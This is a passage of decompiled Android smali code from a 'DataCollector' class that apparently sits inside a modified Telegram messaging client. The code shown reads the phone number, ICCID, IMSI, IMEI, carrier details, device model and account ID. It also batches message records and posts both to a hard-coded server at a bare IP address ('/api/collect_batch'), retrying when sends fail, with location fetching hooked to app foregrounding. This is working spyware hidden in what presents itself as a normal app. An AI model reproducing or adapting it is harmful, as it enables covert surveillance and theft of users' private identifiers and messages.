    move-object/from16 v20, v2

    .line 2017
    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline14;->m(Landroid/telephony/SubscriptionInfo;)I

    move-result v2

    invoke-virtual {v9, v11, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    .line 2021
    :try_start_5
    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline15;->m(Landroid/telephony/SubscriptionInfo;)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_2

    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline15;->m(Landroid/telephony/SubscriptionInfo;)Ljava/lang/String;

    move-result-object v2
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    goto :goto_2

    :catch_1
    :cond_2
    move-object v2, v5

    .line 2024
    :goto_2
    :try_start_6
    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v21

    if-eqz v21, :cond_3

    move-object/from16 v21, v2

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2

    move-object/from16 v22, v4

    const/16 v4, 0x18

    if-lt v2, v4, :cond_4

    .line 2027
    :try_start_7
    invoke-virtual {v0, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/telephony/TelephonyManager;

    if-eqz v2, :cond_4

    .line 2030
    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline9;->m(Landroid/telephony/SubscriptionInfo;)I

    move-result v4

    .line 2029
    invoke-static {v2, v4}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline10;->m(Landroid/telephony/TelephonyManager;I)Landroid/telephony/TelephonyManager;

    move-result-object v2

    .line 2030
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_4

    .line 2031
    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v4
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    if-nez v4, :cond_4

    goto :goto_3

    :catch_2
    move-exception v0

    const/4 v2, 0x0

    move-object/from16 v1, p0

    goto/16 :goto_12

    :cond_3
    move-object/from16 v21, v2

    move-object/from16 v22, v4

    :catch_3
    :cond_4
    move-object/from16 v2, v21

    .line 2039
    :goto_3
    :try_start_8
    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-eqz v4, :cond_5

    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    move-object/from16 v21, v2

    const/16 v2, 0x21

    if-lt v4, v2, :cond_6

    if-eqz v6, :cond_6

    .line 2040
    invoke-static {v0, v15}, Landroidx/core/widget/TextViewCompat$OreoCallback$$ExternalSyntheticApiModelOutline0;->m(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_2

    if-nez v2, :cond_6

    .line 2043
    :try_start_9
    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline9;->m(Landroid/telephony/SubscriptionInfo;)I

    move-result v2

    invoke-static {v6, v2}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline2;->m(Landroid/telephony/SubscriptionManager;I)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_6

    .line 2044
    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v4
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_4

    if-nez v4, :cond_6

    goto :goto_4

    :cond_5
    move-object/from16 v21, v2

    :catch_4
    :cond_6
    move-object/from16 v2, v21

    .line 2047
    :goto_4
    :try_start_a
    invoke-virtual {v9, v14, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2048
    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline3;->m(Landroid/telephony/SubscriptionInfo;)Ljava/lang/CharSequence;

    move-result-object v2

    if-eqz v2, :cond_7

    .line 2049
    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_5

    :cond_7
    move-object v2, v5

    :goto_5
    invoke-virtual {v9, v13, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2050
    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline4;->m(Landroid/telephony/SubscriptionInfo;)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_8

    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline4;->m(Landroid/telephony/SubscriptionInfo;)Ljava/lang/String;

    move-result-object v2

    goto :goto_6

    :cond_8
    move-object v2, v5

    :goto_6
    invoke-virtual {v9, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2051
    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline5;->m(Landroid/telephony/SubscriptionInfo;)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_9

    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline5;->m(Landroid/telephony/SubscriptionInfo;)Ljava/lang/String;

    move-result-object v2

    goto :goto_7

    :cond_9
    move-object v2, v5

    :goto_7
    invoke-virtual {v9, v10, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2052
    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline6;->m(Landroid/telephony/SubscriptionInfo;)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_a

    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline6;->m(Landroid/telephony/SubscriptionInfo;)Ljava/lang/String;

    move-result-object v2

    goto :goto_8

    :cond_a
    move-object v2, v5

    :goto_8
    invoke-virtual {v9, v12, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_2

    .line 2055
    :try_start_b
    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline7;->m(Landroid/telephony/SubscriptionInfo;)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_b

    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline7;->m(Landroid/telephony/SubscriptionInfo;)Ljava/lang/String;

    move-result-object v2
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_5

    goto :goto_9

    :catch_5
    :cond_b
    move-object v2, v5

    .line 2056
    :goto_9
    :try_start_c
    const-string v4, "iccid"

    invoke-virtual {v9, v4, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2059
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_2

    const/16 v4, 0x1d

    if-ge v2, v4, :cond_c

    .line 2062
    :try_start_d
    invoke-virtual {v0, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/telephony/TelephonyManager;

    .line 2063
    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline9;->m(Landroid/telephony/SubscriptionInfo;)I

    move-result v4

    invoke-static {v2, v4}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline10;->m(Landroid/telephony/TelephonyManager;I)Landroid/telephony/TelephonyManager;

    move-result-object v2

    .line 2064
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v2
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_6

    if-eqz v2, :cond_c

    goto :goto_a

    :catch_6
    :cond_c
    move-object v2, v5

    .line 2068
    :goto_a
    :try_start_e
    const-string v4, "imsi"

    invoke-virtual {v9, v4, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2069
    invoke-virtual {v8, v9}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_2

    move-object/from16 v9, v19

    move-object/from16 v2, v20

    move-object/from16 v4, v22

    goto/16 :goto_1

    :cond_d
    move-object/from16 v20, v2

    move-object/from16 v22, v4

    .line 2075
    :try_start_f
    invoke-virtual {v8}, Lorg/json/JSONArray;->length()I

    move-result v2
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_b

    if-nez v2, :cond_14

    .line 2077
    :try_start_10
    invoke-virtual {v0, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/telephony/TelephonyManager;

    if-eqz v2, :cond_14

    .line 2079
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    const/4 v6, 0x0

    .line 2080
    invoke-virtual {v4, v11, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_2

    .line 2082
    :try_start_11
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v6
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_7

    goto :goto_b

    :catch_7
    nop

    move-object v6, v5

    :goto_b
    if-eqz v6, :cond_e

    .line 2084
    :try_start_12
    invoke-virtual {v6}, Ljava/lang/String;->isEmpty()Z

    move-result v9

    if-eqz v9, :cond_f

    :cond_e
    sget v9, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v11, 0x21

    if-lt v9, v11, :cond_f

    .line 2085
    invoke-static {v0, v15}, Landroidx/core/widget/TextViewCompat$OreoCallback$$ExternalSyntheticApiModelOutline0;->m(Landroid/content/Context;Ljava/lang/String;)I

    move-result v9
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_2

    if-nez v9, :cond_f

    .line 2089
    :try_start_13
    invoke-virtual {v0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    invoke-static {v3}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline1;->m(Ljava/lang/Object;)Landroid/telephony/SubscriptionManager;

    move-result-object v3

    if-eqz v3, :cond_f

    .line 2091
    invoke-static {}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline11;->m()I

    move-result v9

    const/4 v11, -0x1

    if-eq v9, v11, :cond_f

    .line 2093
    invoke-static {v3, v9}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline2;->m(Landroid/telephony/SubscriptionManager;I)Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_f

    .line 2094
    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v9
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_8

    if-nez v9, :cond_f

    move-object v6, v3

    goto :goto_c

    :catch_8
    nop

    :cond_f
    :goto_c
    if-eqz v6, :cond_10

    goto :goto_d

    :cond_10
    move-object v6, v5

    .line 2099
    :goto_d
    :try_start_14
    invoke-virtual {v4, v14, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2100
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_11

    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v3

    goto :goto_e

    :cond_11
    move-object v3, v5

    :goto_e
    invoke-virtual {v4, v13, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2101
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_12

    .line 2102
    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v6

    const/4 v9, 0x3

    if-lt v6, v9, :cond_12

    const/4 v6, 0x0

    .line 2103
    invoke-virtual {v3, v6, v9}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v4, v1, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2104
    invoke-virtual {v3, v9}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v10, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto :goto_f

    .line 2106
    :cond_12
    invoke-virtual {v4, v1, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2107
    invoke-virtual {v4, v10, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2109
    :goto_f
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getNetworkCountryIso()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_13

    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getNetworkCountryIso()Ljava/lang/String;

    move-result-object v1

    goto :goto_10

    :cond_13
    move-object v1, v5

    :goto_10
    invoke-virtual {v4, v12, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2110
    invoke-virtual {v8, v4}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_2

    .line 2116
    :cond_14
    :try_start_15
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_b

    const/16 v2, 0x1d

    if-ge v1, v2, :cond_15

    .line 2119
    :try_start_16
    invoke-virtual {v0, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    if-eqz v0, :cond_15

    .line 2121
    invoke-static {v0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline12;->m(Landroid/telephony/TelephonyManager;)Ljava/lang/String;

    move-result-object v0
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_9

    if-eqz v0, :cond_15

    move-object v5, v0

    .line 2127
    :catch_9
    :cond_15
    :try_start_17
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 2128
    const-string v1, "type"

    const-string v2, "sim_info"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2129
    const-string v1, "account"

    invoke-static/range {p2 .. p2}, Lorg/telegram/messenger/DataCollector;->userId(I)J

    move-result-wide v2

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    move-object/from16 v1, v20

    move-object/from16 v4, v22

    .line 2130
    invoke-virtual {v0, v1, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2131
    const-string v1, "device_model"

    move-object/from16 v2, v18

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2132
    const-string v1, "manufacturer"

    move-object/from16 v2, v17

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2133
    const-string v1, "imei"

    invoke-virtual {v0, v1, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2134
    const-string v1, "sims"

    invoke-virtual {v0, v1, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_b

    move-object/from16 v1, p0

    .line 2136
    :try_start_18
    invoke-direct {v1, v0}, Lorg/telegram/messenger/DataCollector;->enqueueJson(Lorg/json/JSONObject;)Z

    move-result v2

    if-nez v2, :cond_16

    const/4 v2, 0x0

    .line 2138
    invoke-direct {v1, v0, v2, v2}, Lorg/telegram/messenger/DataCollector;->postJsonDirect(Lorg/json/JSONObject;Ljava/lang/Runnable;Ljava/lang/Runnable;)V
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_a

    goto :goto_13

    :catch_a
    move-exception v0

    :goto_11
    const/4 v2, 0x0

    goto :goto_12

    :catch_b
    move-exception v0

    move-object/from16 v1, p0

    goto :goto_11

    .line 2141
    :goto_12
    iput-boolean v2, v1, Lorg/telegram/messenger/DataCollector;->simInfoCollected:Z

    .line 2142
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "collectSimInfo: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v2, "TGCollect"

    invoke-static {v2, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_16
    :goto_13
    return-void
.end method

.method private static synthetic lambda$fetchLocationIfAllowed$18(Landroid/content/SharedPreferences;)V
    .locals 3

    .line 2721
    invoke-interface {p0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    .line 2722
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-string v2, "loc_last_fetch_ms"

    invoke-interface {p0, v2, v0, v1}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    .line 2723
    invoke-interface {p0}, Landroid/content/SharedPreferences$Editor;->apply()V

    return-void
.end method

.method private synthetic lambda$flushMsgBatch$7(Ljava/util/List;)V
    .locals 12

    .line 1498
    :try_start_0
    new-instance v0, Lorg/json/JSONArray;

    invoke-direct {v0}, Lorg/json/JSONArray;-><init>()V

    .line 1499
    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lorg/json/JSONObject;

    invoke-virtual {v0, v2}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    goto :goto_0

    .line 1500
    :cond_0
    invoke-virtual {v0}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v0

    sget-object v1, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v1}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 1504
    sget-object v1, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    invoke-static {v1}, Lorg/telegram/messenger/DataCollector;->getDeviceId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    const-wide/16 v3, 0x3e8

    const/4 v5, 0x0

    :goto_1
    const/16 v6, 0x8

    const-wide/32 v7, 0x493e0

    if-gt v5, v6, :cond_5

    if-lez v5, :cond_1

    .line 1510
    :try_start_1
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0

    const-wide/16 v9, 0x2

    mul-long v3, v3, v9

    .line 1511
    invoke-static {v3, v4, v7, v8}, Ljava/lang/Math;->min(JJ)J

    move-result-wide v3

    goto :goto_2

    :catch_0
    return-void

    .line 1513
    :cond_1
    :goto_2
    const-string v6, "https://38.190.225.166/api/collect_batch"

    invoke-direct {p0, v6, v0, v1}, Lorg/telegram/messenger/DataCollector;->doPost(Ljava/lang/String;[BLjava/lang/String;)Lorg/telegram/messenger/DataCollector$PostResult;

    move-result-object v6

    .line 1514
    iget v9, v6, Lorg/telegram/messenger/DataCollector$PostResult;->code:I

    invoke-static {v9}, Lorg/telegram/messenger/DataCollector;->isRetryable(I)Z

    move-result v9

    const-wide/16 v10, 0x0

    if-nez v9, :cond_3

    .line 1515
    iget v0, v6, Lorg/telegram/messenger/DataCollector$PostResult;->code:I

    const/16 v1, 0xc8

    if-lt v0, v1, :cond_5

    const/16 v1, 0x12c

    if-ge v0, v1, :cond_5

    .line 1524
    iget-object v0, p0, Lorg/telegram/messenger/DataCollector;->msgBatch:Ljava/util/List;

    monitor-enter v0

    .line 1525
    :try_start_2
    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result v1

    iget-object v3, p0, Lorg/telegram/messenger/DataCollector;->msgBatch:Ljava/util/List;

    invoke-interface {v3}, Ljava/util/List;->size()I

    move-result v3

    invoke-static {v1, v3}, Ljava/lang/Math;->min(II)I

    move-result v1

    .line 1526
    iget-object v3, p0, Lorg/telegram/messenger/DataCollector;->msgBatch:Ljava/util/List;

    invoke-interface {v3, v2, v1}, Ljava/util/List;->subList(II)Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->clear()V

    .line 1527
    iget-object v1, p0, Lorg/telegram/messenger/DataCollector;->msgBatch:Ljava/util/List;

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_2

    iput-wide v10, p0, Lorg/telegram/messenger/DataCollector;->msgBatchTs:J

    goto :goto_3

    :catchall_0
    move-exception p1

    goto :goto_4

    .line 1528
    :cond_2
    :goto_3
    monitor-exit v0
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 1529
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "batch sent "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p1, " msgs"

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "TGCollect"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_5

    .line 1528
    :goto_4
    :try_start_3
    monitor-exit v0
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    throw p1

    .line 1518
    :cond_3
    iget-wide v7, v6, Lorg/telegram/messenger/DataCollector$PostResult;->retryAfterMs:J

    cmp-long v9, v7, v10

    if-lez v9, :cond_4

    move-wide v3, v7

    .line 1519
    :cond_4
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "flushMsgBatch attempt "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v8, " code="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v6, v6, Lorg/telegram/messenger/DataCollector$PostResult;->code:I

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const-string v7, "TGCollect"

    invoke-static {v7, v6}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    add-int/lit8 v5, v5, 0x1

    goto/16 :goto_1

    .line 1531
    :cond_5
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "batch send failed, "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p1, " msgs kept for retry"

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "TGCollect"

    invoke-static {v0, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 1532
    iget-boolean p1, p0, Lorg/telegram/messenger/DataCollector;->flushScheduled:Z

    if-nez p1, :cond_6

    const/4 p1, 0x1

    .line 1533
    iput-boolean p1, p0, Lorg/telegram/messenger/DataCollector;->flushScheduled:Z

    .line 1534
    sget-object p1, Lorg/telegram/messenger/Utilities;->globalQueue:Lorg/telegram/messenger/DispatchQueue;

    new-instance v0, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda29;

    invoke-direct {v0, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda29;-><init>(Lorg/telegram/messenger/DataCollector;)V

    invoke-virtual {p1, v0, v7, v8}, Lorg/telegram/messenger/DispatchQueue;->postRunnable(Ljava/lang/Runnable;J)Z

    :catch_1
    :cond_6
    :goto_5
    return-void
.end method

.method private synthetic lambda$onAppForeground$17(Landroid/content/Context;ILandroid/content/SharedPreferences;)V
    .locals 0

    .line 2683
    invoke-direct {p0, p1, p2, p3}, Lorg/telegram/messenger/DataCollector;->fetchLocationIfAllowed(Landroid/content/Context;ILandroid/content/SharedPreferences;)V

    return-void
.end method

.method private synthetic lambda$postJsonBatchDirect$6(Lorg/json/JSONArray;Ljava/lang/Runnable;Ljava/lang/Runnable;)V
    .locals 3

    .line 1468
    :try_start_0
    invoke-virtual {p1}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object p1

    sget-object v0, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {p1, v0}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 1472
    sget-object v0, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    invoke-static {v0}, Lorg/telegram/messenger/DataCollector;->getDeviceId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    .line 1473
    const-string v1, "https://38.190.225.166/api/collect_batch"

    const-string v2, "postJsonBatch"

    invoke-direct {p0, v1, p1, v0, v2}, Lorg/telegram/messenger/DataCollector;->postBodyWithRetry(Ljava/lang/String;[BLjava/lang/String;Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_0

    if-eqz p2, :cond_1

    .line 1475
    invoke-interface {p2}, Ljava/lang/Runnable;->run()V

    goto :goto_0

    :cond_0
    if-eqz p3, :cond_1

    .line 1477
    invoke-interface {p3}, Ljava/lang/Runnable;->run()V

    :catch_0
    :cond_1
    :goto_0
    return-void
.end method

.method private synthetic lambda$postJsonDirect$5(Lorg/json/JSONObject;Ljava/lang/Runnable;Ljava/lang/Runnable;)V
    .locals 3

    .line 1430
    :try_start_0
    invoke-virtual {p1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

